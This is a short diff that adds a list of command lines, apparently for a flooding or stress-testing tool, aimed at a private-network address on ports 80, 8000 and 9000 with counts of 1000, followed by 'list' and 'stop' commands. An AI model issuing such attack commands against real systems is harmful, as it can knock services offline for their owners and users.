@@ -1,0 +1,8 @@
+attack -h 192.168.175.129 -p 80 -t 2 -c 1000
+attack -h 192.168.175.129 -p 8000 -t 1 -c 1000
+attack -h 192.168.175.129 -p 8000 -t 0 -c 1000
+attack -h 192.168.175.129 -p 8000 -t 0 -m virtual
+attack -h 192.168.175.129 -p 9000 -t 1 -m virtual
+
+list 
+stop -n 0
